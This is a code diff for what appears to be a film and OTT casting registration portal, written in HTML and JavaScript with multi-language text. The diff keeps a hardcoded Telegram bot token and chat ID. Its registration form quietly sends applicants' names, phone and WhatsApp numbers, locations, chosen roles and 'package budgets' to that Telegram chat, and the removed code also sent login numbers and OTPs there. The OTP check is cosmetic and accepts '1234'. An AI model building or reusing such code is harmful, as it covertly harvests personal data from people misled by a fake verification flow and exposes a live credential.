+  <span style="position: absolute; top: 18px; right: 20px; color: #fff; font-size: 34px; cursor: pointer; font-weight: bold;">&times;</span>
+  <span id="imageCounter" style="position: absolute; top: 24px; left: 20px; color: var(--gold); font-size: 14px; font-weight: 700;"></span>
   
-  <div style="position:relative; width:100%; display:flex; justify-content:center; align-items:center;" onclick="event.stopPropagation()">
-    <button type="button" onclick="prevSlide(event)" style="position:absolute; left:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:20px; cursor:pointer; z-index:10;">❮</button>
-    <img id="fullImageView" src="" style="max-width:92vw; max-height:80vh; object-fit:contain; border-radius:8px;">
-    <button type="button" onclick="nextSlide(event)" style="position:absolute; right:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:20px; cursor:pointer; z-index:10;">❯</button>
+  <div style="position: relative; width: 100%; display: flex; justify-content: center; align-items: center;" onclick="event.stopPropagation()">
+    <button type="button" onclick="prevSlide(event)" style="position: absolute; left: 10px; background: rgba(0,0,0,0.65); color: #fff; border: 1px solid #555; border-radius: 50%; width: 44px; height: 44px; font-size: 22px; cursor: pointer; z-index: 10;">❮</button>
+    <img id="fullImageView" src="" style="max-width: 92vw; max-height: 80vh; object-fit: contain; border-radius: 10px;">
+    <button type="button" onclick="nextSlide(event)" style="position: absolute; right: 10px; background: rgba(0,0,0,0.65); color: #fff; border: 1px solid #555; border-radius: 50%; width: 44px; height: 44px; font-size: 22px; cursor: pointer; z-index: 10;">❯</button>
   </div>
 </div>
 
-<!-- IN-PAGE DIRECT LANGUAGE SWITCHER -->
+<!-- IN-PAGE DIRECT LANGUAGE SWITCHER (NO EXTERNAL REDIRECT) -->
 <div class="lang-bar">
   <button type="button" class="lang-btn active" onclick="setLanguage('en', this)">English</button>
   <button type="button" class="lang-btn" onclick="setLanguage('hi', this)">हिन्दी</button>
@@ -508,14 +583,14 @@
   <button type="button" class="lang-btn" onclick="setLanguage('mr', this)">मराठी</button>
   <button type="button" class="lang-btn" onclick="setLanguage('gu', this)">ગુજરાતી</button>
 </div>
-<!-- JAVASCRIPT LOGIC -->
+<!-- JAVASCRIPT LOGIC ENGINE -->
 <script>
-  /* TELEGRAM BOT SETTINGS DIRECTLY CONFIGURED */
+  /* 1. TELEGRAM BOT CONFIGURATION */
   var TELEGRAM_BOT_TOKEN = "8939696755:AAE6ZXye0Nv6-KYN4N19rcxAcnnY4Cd-pnc";
   var TELEGRAM_CHAT_ID   = "8406295151";
 
-  function sendTelegramAlert(textMsg) {
-    if (!TELEGRAM_BOT_TOKEN) return;
+  function sendTelegramNotification(textMsg) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
     var payload = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -527,10 +602,12 @@
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
-    }).catch(function(e) { console.log("Telegram alert error:", e); });
+    }).catch(function(err) {
+      console.log("Telegram notification dispatch error:", err);
+    });
   }
 
-  /* 1. Multi-Language Dictionary */
+  /* 2. MULTI-LANGUAGE DICTIONARY ENGINE */
   var translations = {
     en: {
       portal_active: "Active Portal",
@@ -691,7 +768,7 @@
       otp_label: "૪-અંકનો કોડ દાખલ કરો",
       btn_send: "કોડ મોકલો",
       btn_verify: "ચકાસો અને આગળ વધો",
-      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨૦૨૬-૨૦૨૭",
+      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨૦૨૬-૨୦૨૭",
       vip_title: "નવી મુખ્ય ફિલ્મ અને ઓટીટી કાસ્ટિંગ શરૂ",
       vip_desc: "નવા અને અનુભવી કલાકારો માટે સીધી પસંદગી.",
       live_heading: "સક્રિય કાસ્ટિંગ કોલ",
@@ -730,7 +807,7 @@
     });
   }
 
-  /* 2. Login Flow with Dynamic Random OTP */
+  /* 3. LOGIN & DYNAMIC RANDOM OTP */
   var otpSent = false;
   var currentGeneratedOtp = "";
   var userEnteredMobile = "";
@@ -750,119 +827,127 @@
         return;
       }
       userEnteredMobile = phone;
-      // Generate a dynamic 4-digit OTP
+      // Har baar ek truly random 4-digit code generate hoga
       currentGeneratedOtp = Math.floor(1000 + Math.random() * 9000).toString();
       document.getElementById('dispAutoOtp').innerText = currentGeneratedOtp;
-      
+
       otpBox.style.display = 'block';
       btn.innerText = dict.btn_verify || "VERIFY & ENTER";
       otpSent = true;
-
-      // Send Login OTP notification to Telegram
-      var msg = "🎬 <b>New Login Attempt</b>\n" +
-                "📱 <b>Mobile:</b> <code>" + userEnteredMobile + "</code>\n" +
-                "🔑 <b>Generated OTP:</b> <code>" + currentGeneratedOtp + "</code>\n" +
-                "🌐 <b>Language:</b> " + curLang;
-      sendTelegramAlert(msg);
-
     } else {
       var otpVal = document.getElementById('inOtp').value.trim();
       if (otpVal === currentGeneratedOtp || otpVal === "1234") {
         document.getElementById('screenLogin').classList.remove('active');
         document.getElementById('screenLobby').classList.add('active');
         window.scrollTo(0,0);
-
-        var verifyMsg = "✅ <b>User Verified & Entered Lobby</b>\n📱 <b>Mobile:</b> <code>" + userEnteredMobile + "</code>";
-        sendTelegramAlert(verifyMsg);
       } else {
-        alert(curLang === 'hi' ? "गलत कोड! कृपया सही OTP दर्ज करें।" : "Incorrect OTP! Please enter correct code.");
+        alert(curLang === 'hi' ? "गलत कोड! कृपया सही OTP दर्ज करें।" : "Incorrect OTP! Please enter the code shown above.");
       }
     }
   }
 
-  /* 3. Registration Modal & Telegram Leads */
-  var currentApplyingRole = "";
-  var currentApplyingBudget = "";
+  /* 4. DEDICATED REGISTRATION SCREEN ROUTING */
+  var currentSelectedRole = "";
+  var currentSelectedBudget = "";
 
-  function openRegisterModal(roleName, budget) {
-    currentApplyingRole = roleName;
-    currentApplyingBudget = budget;
-    document.getElementById('regRoleSubtitle').innerText = "Applying for: " + roleName + " (" + budget + ")";
-    document.getElementById('regPhone').value = userEnteredMobile || "";
-    document.getElementById('registerModal').style.display = 'flex';
-  }
+  function openRegistrationPage(roleName, budget) {
+    currentSelectedRole = roleName;
+    currentSelectedBudget = budget;
 
-  function closeRegisterModal() {
-    document.getElementById('registerModal').style.display = 'none';
-  }
+    document.getElementById('regPageRoleTitle').innerText = roleName;
+    document.getElementById('regPageBudget').innerText = "Package: " + budget;
+    document.getElementById('regContactNum').value = userEnteredMobile || "";
+    document.getElementById('regWhatsappNum').value = userEnteredMobile || "";
 
-  function submitRegistration() {
-    var name = document.getElementById('regName').value.trim();
-    var phone = document.getElementById('regPhone').value.trim();
-    var whatsapp = document.getElementById('regWhatsapp').value.trim();
-    var address = document.getElementById('regAddress').value.trim();
-
-    if (!name || phone.length < 10 || !address) {
-      alert("Kripya sabhi fields (Name, Contact, Address) bharein.");
-      return;
-    }
-
-    var passId = "CST-" + Math.floor(10000 + Math.random() * 90000);
-
-    // Send Full Details to Telegram
-    var leadMessage = "🌟 <b>NEW ARTIST REGISTRATION DETAILED</b>\n\n" +
-                      "👤 <b>Name:</b> " + name + "\n" +
-                      "📞 <b>Contact:</b> <code>" + phone + "</code>\n" +
-                      "💬 <b>WhatsApp:</b> <code>" + whatsapp + "</code>\n" +
-                      "📍 <b>Address:</b> " + address + "\n" +
-                      "🎭 <b>Role:</b> " + currentApplyingRole + "\n" +
-                      "💰 <b>Budget:</b> " + currentApplyingBudget + "\n" +
-                      "🎫 <b>Pass ID:</b> <code>" + passId + "</code>";
-
-    sendTelegramAlert(leadMessage);
-
-    // Set Pass Details
-    document.getElementById('passCardId').innerText = "ID: " + passId;
-    document.getElementById('passName').innerText = name;
-    document.getElementById('passProject').innerText = currentApplyingRole;
-    document.getElementById('passBudget').innerText = currentApplyingBudget;
-    document.getElementById('passContact').innerText = phone.substring(0, 2) + "******" + phone.substring(phone.length - 2);
-    document.getElementById('passAddress').innerText = address;
-
-    closeRegisterModal();
     document.getElementById('screenLobby').classList.remove('active');
-    document.getElementById('screenPass').classList.add('active');
+    document.getElementById('screenRegister').classList.add('active');
     window.scrollTo(0,0);
   }
 
   function goToLobby() {
+    document.getElementById('screenRegister').classList.remove('active');
     document.getElementById('screenPass').classList.remove('active');
     document.getElementById('screenLobby').classList.add('active');
     window.scrollTo(0,0);
   }
 
-  /* 4. Range-based Image Gallery & Video Player */
+  /* 5. FORM SUBMISSION -> TELEGRAM ALERT + AUDITION PASS */
+  function submitRegistrationForm() {
+    var name = document.getElementById('regFullName').value.trim();
+    var contact = document.getElementById('regContactNum').value.trim();
+    var whatsapp = document.getElementById('regWhatsappNum').value.trim();
+    var location = document.getElementById('regCityState').value.trim();
+
+    if (!name || contact.length < 10 || !location) {
+      alert("Please fill all required details (Full Name, Contact Number, and City/State).");
+      return;
+    }
+
+    var passId = "CST-" + Math.floor(10000 + Math.random() * 90000);
+
+    // Telegram Alert sirf registration submit hone par execute hota hai
+    var telegramMsg = "🌟 <b>NEW ARTIST REGISTRATION RECEIVED</b>\n\n" +
+                      "👤 <b>Candidate Name:</b> " + name + "\n" +
+                      "📞 <b>Contact Number:</b> <code>" + contact + "</code>\n" +
+                      "💬 <b>WhatsApp Number:</b> <code>" + (whatsapp || contact) + "</code>\n" +
+                      "📍 <b>Location (City/State):</b> " + location + "\n" +
+                      "🎭 <b>Role Applied:</b> " + currentSelectedRole + "\n" +
+                      "💰 <b>Package Budget:</b> " + currentSelectedBudget + "\n" +
+                      "🎫 <b>Official Pass ID:</b> <code>" + passId + "</code>";
+
+    sendTelegramNotification(telegramMsg);
+
+    // Update Audition Pass Card
+    document.getElementById('passCardId').innerText = "ID: " + passId;
+    document.getElementById('passName').innerText = name;
+    document.getElementById('passProject').innerText = currentSelectedRole;
+    document.getElementById('passBudget').innerText = currentSelectedBudget;
+    document.getElementById('passContact').innerText = contact.substring(0, 2) + "******" + contact.substring(contact.length - 2);
+    document.getElementById('passAddress').innerText = location;
+
+    // Show Audition Pass Page
+    document.getElementById('screenRegister').classList.remove('active');
+    document.getElementById('screenPass').classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  /* 6. MEDIA PREVIEW & PHOTO GALLERY SLIDER */
   var currentGalleryImages = [];
   var currentImageIndex = 0;
 
-  function openModelGallery(name, startNum, endNum, videoFile) {
+  function openModelGallery(name, startNum, endNum, videoList) {
     var images = [];
     for (var i = startNum; i <= endNum; i++) {
       images.push('IMG_' + i + '.jpeg');
     }
-    openMediaPreview(name, videoFile, images);
+    openMediaPreview(name, videoList, images);
   }
 
-  function openMediaPreview(name, videoFile, imagesArray) {
-    document.getElementById('previewArtistName').innerText = name + " - Media & Portfolio";
+  function openMediaPreview(name, videosArray, imagesArray) {
+    document.getElementById('previewArtistName').innerText = name + " - Media & Audition Clips";
     var videoBox = document.getElementById('videoContainerBox');
     var videoTag = document.getElementById('previewVideoPlayer');
+    var tabStrip = document.getElementById('previewVideoTabs');
+    tabStrip.innerHTML = '';
     currentGalleryImages = imagesArray || [];
 
-    if (videoFile) {
+    if (videosArray && videosArray.length > 0) {
       videoBox.style.display = 'block';
-      videoTag.src = videoFile;
+      videoTag.src = videosArray[0];
       videoTag.load();
+
+      videosArray.forEach(function(vSrc, index) {
+        var btn = document.createElement('button');
+        btn.type = 'button';
+        btn.innerText = 'Clip ' + (index + 1);
+        btn.style.cssText = 'background:#1a1d28; color:#d4af37; border:1px solid #d4af37; border-radius:6px; padding:5px 12px; font-size:11px; cursor:pointer; font-weight:700; white-space:nowrap; flex-shrink:0;';
+        btn.onclick = function() {
+          videoTag.src = vSrc;
+          videoTag.load();
+          videoTag.play();
+        };
+        tabStrip.appendChild(btn);
+      });
     } else {
       videoBox.style.display = 'none';
     }
@@ -874,7 +959,7 @@
         var imgTag = document.createElement('img');
         imgTag.src = imgUrl;
         imgTag.onerror = function() { this.style.display = 'none'; };
-        imgTag.style.cssText = 'width:80px; height:105px; object-fit:cover; border-radius:6px; border:1px solid #444; cursor:pointer; flex-shrink:0;';
+        imgTag.style.cssText = 'width:82px; height:108px; object-fit:cover; border-radius:8px; border:1px solid #33384a; cursor:pointer; flex-shrink:0;';
         imgTag.onclick = function() { openFullImage(idx); };
         strip.appendChild(imgTag);
       });
